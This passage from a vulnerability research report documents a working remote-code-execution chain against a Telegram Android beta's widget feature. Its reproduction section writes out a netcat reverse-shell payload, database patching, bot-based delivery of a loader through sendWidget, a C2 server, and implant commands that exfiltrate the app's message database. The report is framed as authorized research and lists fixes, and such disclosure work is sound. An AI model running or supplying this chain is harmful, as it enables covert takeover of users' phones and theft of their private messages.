(`*.png`, `*.mp4`), tombstones, `poc/bot_*.session`, `poc/repro_intr3`
(5.4 MB ELF harness binary), `lab/` (11 GB, except the two loader templates and
`loaders/size_variants/` needed by the shipped builders), `evidence/` bulk
(799 MB), `apks/` (10 beta APK variants), `macOSbeta-272030.zip` (122 MB),
`__pycache__/`, `.pyc` files.

### 7.7 Zip extras

| File | What it is |
|---|---|
| `minimal_poc/poc.html` | **the single-file PoC**: byte-identical to the Pixel-delivered HTML and one of the Sony 72879 proofs (see §4.4) |
| `minimal_poc/README.md` | full explanation of every block of `poc.html`, customization, delivery, expected results |
| `minimal_poc/send_poc.py` | stdlib-only beta `sendWidget` sender (`--dry-run`, `--host/--port`) |
| `ZIP_REVIEW.md` | archive audit: layout, integrity, APK identities, security scan, fixed issues, exclusions, residual caveats |

---

## 8. Reproduction steps

> Prerequisites: a Telegram Android beta 13.2.0 device (widget feature), a
> whitelisted widget bot for remote delivery (or root for the DB patch),
> Python 3 (stdlib only for the C2; `cryptography` only for the AES loader
> builder), `adb` for the DB-patch channel. **Do not run the exploit or the C2
> against devices you do not own or are not explicitly authorized to test.**

### 8.1 Host-only sanity (no phone)

```sh
cd telegramandroidwidget/c2
./run_local_test.sh          # 74 checks: server + 2 mock implants + loader bootstrap
```

### 8.2 Local #1792 find-UAF engine PoC (ASan, no phone)

```sh
cd telegramandroidwidget/poc
./verify.sh /tmp/opencode/qjs-poc     # builds quickjs-ng v0.17.0 + ASan, runs poc_verify.c
# expect: [PASS] heap-use-after-free reproduced (js_array_find double free)
```

### 8.3 Local DB patch channel (Sony-class device, root/ADB)

```sh
# 0. pull the DB
adb pull /data/data/org.telegram.messenger.beta/files/cache4.db cache4.db

# 1. swap the endgame command for the C2 bootstrap (any exploit payload)
cd telegramandroidwidget/c2
python3 tools/patch_payload.py \
  --input ../lab/qjs_postsnapshot/widget_poc_1865_universal_v2.html \
  --output /tmp/opencode/poc_c2.html \
  --command "setsid sh -c '/system/bin/sleep 2|/system/bin/toybox nc <LAN_IP> 5555|sh' &" \
  --limit 0
# or the bot-size route (§8.4): patch conservative_min.js and rebuild the 4 KiB loader
python3 tools/make_loader_4096.py --payload /tmp/opencode/payload_c2.js \
  --pin 19111998 --output /tmp/opencode/loader_c2.html

# 2. install the payload into a widget message
python3 ../tools/widget_tool.py cache4.db 79415 --html /tmp/opencode/poc_c2.html

# 3. stop app, push DB, drop WAL/SHM, restart, open the chat
adb shell am force-stop org.telegram.messenger.beta
adb push cache4.db /data/data/org.telegram.messenger.beta/files/cache4.db
adb shell rm -f /data/data/org.telegram.messenger.beta/files/cache4.db-wal \
                 /data/data/org.telegram.messenger.beta/files/cache4.db-shm
adb shell monkey -p org.telegram.messenger.beta 1
```

### 8.4 Bot delivery channel (Pixel-class, no root)

```sh
# 1. C2 server on the LAN (loader port must match the payload's CMD)
python3 c2/server/c2_server.py --host <LAN_IP> --allow-lan \
  --port 4444 --loader-port 4445 --token <C2_TOKEN>

# 2. verify the loader fits the bot limits
python3 - <<'PY'
import zlib
d = open('poc/loader_v7_plain_text_cec.html','rb').read()
print(len(d), len(zlib.compress(d, 9)))     # 7460 3056 -> <= 32768 and <= 4096
PY

# 3. send it through the whitelisted widget bot
curl -s -X POST "https://api.telegram.org/beta/bot<BOT_TOKEN>/sendWidget" \
  -H "Content-Type: application/json" \
  -d '{"chat_id": <chat id>, "html": '"$(python3 -c \
      "import json;print(json.dumps(open('poc/loader_v7_plain_text_cec.html').read()))")"'}'

# 4. on the phone: open the widget (auto-runs). Server log should show
#    "loader: serving 39346 bytes …" then "session 1 hello implant=tg-…".
#    Verify: sessions / use <sid> / exec id
```

### 8.5 C2 verification and stop

```sh
sessions
use <sid>
exec id; getprop ro.product.model
ping
get /data/user/0/org.telegram.messenger.beta/files/cache4.db   # exfil (sha256-verified)
bye stop          # implant + supervisor exit
quit              # stop the server
```

---

## 9. Evidence summary

- **#1827 device RCE (Sony 72799):** `evidence/evidence_20261101/regexp1827_class64_device/`
  (`rce_proof_uid10357.txt` = `uid=10357(u0_a357) … untrusted_app`,
  `screen_rce1827_v3.png`, `tw_v3.db`, `device_payload_v3_72799_dbg.js`).
- **#1827 universal resolver:** `evidence/evidence_20261102/regexp1827_class64_universal/`
  (proof + payloads; markers `VIEWS=8 → CTX → free=… → elfbase=… → system=… →
  HOOKED → AFTER`).
- **#1827 on Android 17 / MTE:** `evidence/evidence_20261102/pixel_mte/`
  (proof `uid=10178 … untrusted_app_34`, `app_smaps_mte.txt` shows 44-56
  PROT_MTE `scudo:primary` mappings, `mte_mapping_analysis.txt` explains why
  MTE does not stop the chain).
- **#1827 bot-delivered release C2 (final):** `evidence/c2_pixel_android17_proof.log`
  + `evidence/sendwidget_test_5511.json` (Pixel 9, Android 17, release
  package, `tg-10290-Pixel_9`, `exec rc=0`, proof messages 5512/5513), and
  the release-72801 Sony run `evidence/c2_release_72801_proof.log`
  (`tg-10372-XQ-BT52-release`, `uid=10372`).
- **#1865 device RCE (Sony 72789):** `evidence/evidence_20261101/rce_proof.txt`
  (md5 `e06bf2b4…`), `rce2.png`, `rce2.db`; 10/10 reproducibility log.
- **#1865 72799 campaign:** `evidence/evidence_20261101/new_beta_72799/`
  (v2 10/10, v4 9/10, `tombstone_20.txt`, OTA markers).
- **Reverse shell:** `evidence/evidence_20261101/revshell/` (sanitized `id`
  output); note `notes/reverse_shell_poc.md`.
- **DoS proofs:** tombstone_13 (#1835 WeakMap), tombstone_14 (#1827 fake
  bytecode SIGABRT in `lre_exec+0x1868`), tombstones 15-17 (#1865 decoder
  calibration), tombstone_20 (v4 outlier), M1 break test logs (no
  post-interrupt JS).
- **C2 sessions:** `evidence/evidence_20261102/c2_newrce/` (#1827-v3 session +
  server-restart reconnect), `c2_pixel_android17_proof.log` (bot-delivered).

All of the above are in the research tree; the zip ships the small text
evidence listed in §7.6.

---

## 10. Limitations, fixes and version boundaries

- **Engine ABI**: remaining fixed values are quickjs-ng struct offsets
  (`rt+16`, `rt+64`, `ctx+16`, bytecode+0x48, JSObject/JSString/JSBigInt
  layouts). A future engine can move them; and may fix #1827/#1865.
- **Heap geometry**: Scudo top-gap first-fit is process-VA-state dependent;
  the device exploit is not production-stable (0/5 in one stability series;
  lab 10/10). One run is not a measurement.
- **No runtime device/OS signal** exists in widget JS (`navigator.userAgent`
  fixed, no Android fields), so a single deterministic universal groom was
  not achieved; the A/T groom (Sony-like vs Pixel-like layouts) is the
  accepted two-variant strategy for #1865; the v7 #1827 payload scans
  candidates instead.
- **Fixes**: update quickjs-ng past the fixes (#1827/#1865/#1844/#1829/#1792);
  reject >65,535 captured variables (#1869); consider disabling
  `eval`/`Function` for widgets; render widgets in an isolated, seccomp'd
  process; opt into MTE; keep widget sending allowlisted.
- **armv7**: partial port only (controlled crash at fake-bytecode OOB;
  jemalloc class-32 adjacency not solved); not shipped as a payload.
- **Scope**: authorized research on the author's own device and account.

---

## 11. Reproduce-map (zip contents)

The repro zip (`/tmp/opencode/android_widget_poc_repro.zip`) contains:
`REPRODUCE.txt` (exact steps, redacted tokens), `android_widget_poc_full.md`
(this file), `ZIP_REVIEW.md` (archive audit), `minimal_poc/` (the single-file
PoC + explanation + sender), the **release target APK pair**
`Android_13.2.0_release_base.apk` + `Android_13.2.0_release_arm64.apk`
(13.2.0 / 72801), the historical beta
`Android_Beta_13.2.0_(72789).apk`, `reports/` (the five report files),
`notes/` (the key chain/C2 notes), `poc/` (agents + payloads + harnesses),
`c2/` (server + implant + tools + test), `tools/`, `payloads/` (#1827 and
#1865 lab payloads: loader templates + `size_variants` under
`lab/qjs_postsnapshot/` so the builders run unmodified), `evidence/` (small
proof files only). See REPRODUCE.txt for the exact file-by-file map.

---

*End of document.*
